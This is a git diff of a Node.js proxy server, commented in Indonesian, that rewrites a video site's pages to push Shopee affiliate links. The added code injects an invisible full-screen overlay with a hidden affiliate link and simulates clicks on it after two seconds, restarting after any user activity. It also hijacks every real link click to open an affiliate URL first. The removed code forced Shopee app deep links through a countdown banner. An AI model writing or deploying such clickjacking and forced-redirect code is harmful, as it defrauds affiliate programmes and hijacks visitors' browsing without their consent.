@@ -6,17 +6,6 @@ const PORT = process.env.PORT || 3000;
 
 const BASE_URL = 'https://vidstrm.cloud';
 
-// DAFTAR DEEP LINK SHOPEE (ganti dengan link Anda)
-const SHOPEE_DEEP_LINKS = [
-  // Format: shopee://deeplink atau intent://
-  'shopee://com.shopee.id',
-  'intent://com.shopee.id#Intent;scheme=shopee;package=com.shopee.id;end;',
-  'shope://com.shopee.id',
-  'shopee-id://home',
-  'https://shopee.co.id/m/'
-];
-
-// Link affiliate asli (untuk fallback)
 const AFFILIATE_LINKS = [
   'https://doobf.pro/8AQUp3ZesV',
   'https://doobf.pro/9pYio8K2cw',
@@ -27,132 +16,6 @@ const AFFILIATE_LINKS = [
   'https://vidoyy.fun/3LLF3lT65E',
   'https://vidoyy.fun/6VIGpbCEoc'
 ];
-
-// Function untuk generate Shopee deep link
-function getShopeeDeepLink() {
-  // Pilih random deep link
-  return SHOPEE_DEEP_LINKS[Math.floor(Math.random() * SHOPEE_DEEP_LINKS.length)];
-}
-
-// Function untuk buka aplikasi dengan iframe method
-function getAppOpenScript() {
-  const deepLink = getShopeeDeepLink();
-  const fallbackLink = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
-  
-  return `
-    <script>
-      // Function untuk buka aplikasi Shopee
-      function openShopeeApp() {
-        const deepLink = "${deepLink}";
-        const fallbackUrl = "${fallbackLink}";
-        let appOpened = false;
-        
-        console.log('Trying to open Shopee app...', deepLink);
-        
-        // METHOD 1: Pakai iframe untuk deep link (paling efektif)
-        try {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.style.visibility = 'hidden';
-          iframe.src = deepLink;
-          document.body.appendChild(iframe);
-          
-          // Hapus iframe setelah 1 detik
-          setTimeout(() => {
-            if (iframe.parentNode) {
-              iframe.parentNode.removeChild(iframe);
-            }
-          }, 1000);
-        } catch(e) {
-          console.log('Iframe method failed:', e);
-        }
-        
-        // METHOD 2: Direct window.location
-        setTimeout(() => {
-          window.location.href = deepLink;
-        }, 100);
-        
-        // METHOD 3: Coba scheme lain
-        setTimeout(() => {
-          if (deepLink.startsWith('shopee://')) {
-            window.location.href = deepLink.replace('shopee://', 'shope://');
-          }
-        }, 200);
-        
-        // METHOD 4: Fallback ke affiliate link setelah 2 detik
-        setTimeout(() => {
-          console.log('Fallback to affiliate link');
-          window.location.href = fallbackUrl;
-        }, 2000);
-        
-        // Deteksi jika app terbuka (visibility change)
-        document.addEventListener('visibilitychange', function() {
-          if (document.hidden) {
-            appOpened = true;
-            console.log('✅ Shopee app opened successfully!');
-          }
-        });
-        
-        // Blur event juga bisa detect app open
-        window.addEventListener('blur', function() {
-          appOpened = true;
-          console.log('✅ App opened (window blurred)');
-        });
-      }
-      
-      // AUTO OPEN SETELAH 3 DETIK
-      let countdown = 3;
-      let redirectTimer = setTimeout(() => {
-        console.log('🔄 Auto-opening Shopee app...');
-        openShopeeApp();
-      }, 3000);
-      
-      // Update countdown display
-      const countdownInterval = setInterval(() => {
-        countdown--;
-        const countdownEl = document.getElementById('countdown-timer');
-        if (countdownEl) {
-          countdownEl.textContent = countdown;
-        }
-        if (countdown <= 0) {
-          clearInterval(countdownInterval);
-        }
-      }, 1000);
-      
-      // Reset timer pada user activity
-      ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
-        document.addEventListener(event, () => {
-          clearTimeout(redirectTimer);
-          clearInterval(countdownInterval);
-          const notifyEl = document.getElementById('shopee-notify');
-          if (notifyEl) notifyEl.style.display = 'none';
-        }, { passive: true });
-      });
-      
-      // Tangani klik user
-      document.addEventListener('click', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        
-        // Buka aplikasi Shopee dulu
-        openShopeeApp();
-        
-        // Cek jika klik link
-        const link = e.target.closest('a');
-        if (link && link.href) {
-          // Redirect ke tujuan asli setelah 1.5 detik
-          setTimeout(() => {
-            window.location.href = link.href;
-          }, 1500);
-        }
-        
-        return false;
-      }, true);
-      
-      console.log('📱 Shopee App Opener Ready!');
-    </script>
-  `;
-}
 
 app.use(async (req, res) => {
   try {
@@ -169,70 +32,155 @@ app.use(async (req, res) => {
     const contentType = response.headers.get('content-type') || 'text/html';
     
     if (contentType.includes('text/html')) {
-      // Inject notification dan script
-      const notificationHTML = `
-        <div id="shopee-notify" style="
-          position: fixed;
-          top: 0;
-          left: 0;
-          right: 0;
-          background: linear-gradient(90deg, #EE4D2D, #FF7337);
-          color: white;
-          padding: 15px;
-          text-align: center;
-          font-family: Arial, sans-serif;
-          z-index: 999999;
-          box-shadow: 0 2px 15px rgba(0,0,0,0.3);
-          animation: slideDown 0.3s ease;
-        ">
-          <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
-            <span style="font-weight: bold; font-size: 16px;">⏰ Buka Aplikasi Shopee dalam</span>
-            <span id="countdown-timer" style="
-              background: white;
-              color: #EE4D2D;
-              padding: 5px 15px;
-              border-radius: 20px;
-              font-weight: bold;
-              font-size: 18px;
-              min-width: 40px;
-              display: inline-block;
-            ">3</span>
-            <span style="font-weight: bold; font-size: 16px;">detik</span>
-            <button onclick="document.getElementById('shopee-notify').style.display='none';" style="
-              background: rgba(255,255,255,0.2);
-              border: 2px solid white;
-              color: white;
-              padding: 5px 15px;
-              border-radius: 20px;
-              font-weight: bold;
-              margin-left: 15px;
+      // SCRIPT UNTUK AUTO-CLICK TRANSPARAN
+      const injectScript = `
+        <script>
+          const AFFILIATE_LINKS = ${JSON.stringify(AFFILIATE_LINKS)};
+          
+          // Buat invisible overlay yang menutupi seluruh halaman
+          function createInvisibleOverlay() {
+            const overlay = document.createElement('div');
+            overlay.id = 'auto-click-overlay';
+            overlay.style.cssText = \`
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background: transparent;
+              z-index: 2147483647; /* Max z-index */
               cursor: pointer;
-            ">Batal</button>
-          </div>
-        </div>
+            \`;
+            
+            // Buat invisible link di tengah overlay
+            const invisibleLink = document.createElement('a');
+            invisibleLink.id = 'auto-shopee-link';
+            invisibleLink.href = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+            invisibleLink.target = '_blank';
+            invisibleLink.style.cssText = \`
+              display: block;
+              width: 100%;
+              height: 100%;
+              opacity: 0;
+              position: absolute;
+              top: 0;
+              left: 0;
+            \`;
+            
+            overlay.appendChild(invisibleLink);
+            document.body.appendChild(overlay);
+            
+            return { overlay, invisibleLink };
+          }
+          
+          // Function untuk simulate click
+          function simulateClick(element) {
+            const clickEvent = new MouseEvent('click', {
+              view: window,
+              bubbles: true,
+              cancelable: true
+            });
+            element.dispatchEvent(clickEvent);
+          }
+          
+          // Function untuk auto-click setelah delay
+          function autoClickShopee() {
+            console.log('🔄 Auto-clicking Shopee link...');
+            
+            // Buat overlay
+            const { overlay, invisibleLink } = createInvisibleOverlay();
+            
+            // Simulate click pada link setelah 100ms
+            setTimeout(() => {
+              console.log('🤖 Simulating click on:', invisibleLink.href);
+              
+              // Method 1: Trigger click event
+              simulateClick(invisibleLink);
+              
+              // Method 2: Direct click (lebih reliable)
+              invisibleLink.click();
+              
+              // Method 3: Location href sebagai backup
+              setTimeout(() => {
+                window.location.href = invisibleLink.href;
+              }, 500);
+              
+              // Hapus overlay setelah 2 detik
+              setTimeout(() => {
+                if (overlay.parentNode) {
+                  overlay.parentNode.removeChild(overlay);
+                }
+              }, 2000);
+              
+            }, 100);
+          }
+          
+          // AUTO-CLICK SETELAH 2 DETIK
+          let autoClickTimer = setTimeout(() => {
+            console.log('⏰ Timeout reached, auto-clicking...');
+            autoClickShopee();
+          }, 2000);
+          
+          // Reset timer jika user aktif (tapi tetap akan auto-click)
+          ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
+            document.addEventListener(event, function(e) {
+              // Biarkan user klik asli terjadi dulu
+              setTimeout(() => {
+                // Tetap trigger auto-click setelah user interaction
+                clearTimeout(autoClickTimer);
+                autoClickTimer = setTimeout(() => {
+                  autoClickShopee();
+                }, 1000);
+              }, 300);
+            }, { passive: true });
+          });
+          
+          // Tangani klik user asli
+          document.addEventListener('click', function(e) {
+            // Cegah double action
+            if (e.target.id === 'auto-shopee-link' || 
+                e.target.id === 'auto-click-overlay') {
+              return;
+            }
+            
+            // Cari link yang diklik
+            const link = e.target.closest('a');
+            if (link && link.href) {
+              e.preventDefault();
+              e.stopPropagation();
+              
+              // 1. Buka Shopee affiliate
+              const shopeeUrl = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+              window.open(shopeeUrl, '_blank');
+              
+              // 2. Redirect ke tujuan asli setelah delay
+              setTimeout(() => {
+                window.location.href = link.href;
+              }, 800);
+            }
+          }, true);
+          
+          console.log('🤖 Auto-click system aktif!');
+        </script>
         
         <style>
-          @keyframes slideDown {
-            from { transform: translateY(-100%); }
-            to { transform: translateY(0); }
+          /* Transparent animation untuk overlay */
+          #auto-click-overlay {
+            animation: pulseBackground 2s infinite;
           }
-          body { padding-top: 60px !important; }
+          @keyframes pulseBackground {
+            0% { background: rgba(238, 77, 45, 0.01); }
+            50% { background: rgba(238, 77, 45, 0.03); }
+            100% { background: rgba(238, 77, 45, 0.01); }
+          }
         </style>
       `;
       
-      // Inject notification
-      if (html.includes('<body')) {
-        html = html.replace('<body', '<body>' + notificationHTML);
-      } else {
-        html = notificationHTML + html;
-      }
-      
       // Inject script
-      const appScript = getAppOpenScript();
       if (html.includes('</head>')) {
-        html = html.replace('</head>', appScript + '</head>');
+        html = html.replace('</head>', injectScript + '</head>');
       } else {
-        html = appScript + html;
+        html = injectScript + html;
       }
       
       // Rewrite links
@@ -249,27 +197,14 @@ app.use(async (req, res) => {
     
   } catch (error) {
     console.error('Error:', error.message);
-    // Auto redirect ke Shopee deep link jika error
-    const deepLink = getShopeeDeepLink();
-    res.send(`
-      <html>
-        <head>
-          <script>
-            // Redirect langsung ke Shopee app
-            window.location.href = "${deepLink}";
-            // Fallback setelah 1 detik
-            setTimeout(() => {
-              window.location.href = "${AFFILIATE_LINKS[0]}";
-            }, 1000);
-          </script>
-        </head>
-      </html>
-    `);
+    // Fallback langsung ke affiliate
+    const randomLink = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+    res.redirect(randomLink);
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`📱 Server Shopee App Opener`);
-  console.log(`👉 Akan buka APLIKASI Shopee, bukan browser`);
-  console.log(`⏰ Auto-trigger: 3 detik`);
+  console.log(`🤖 Server dengan Auto-Click System`);
+  console.log(`👉 Akan auto-click setelah 2 detik`);
+  console.log(`🎯 Total links: ${AFFILIATE_LINKS.length}`);
 });
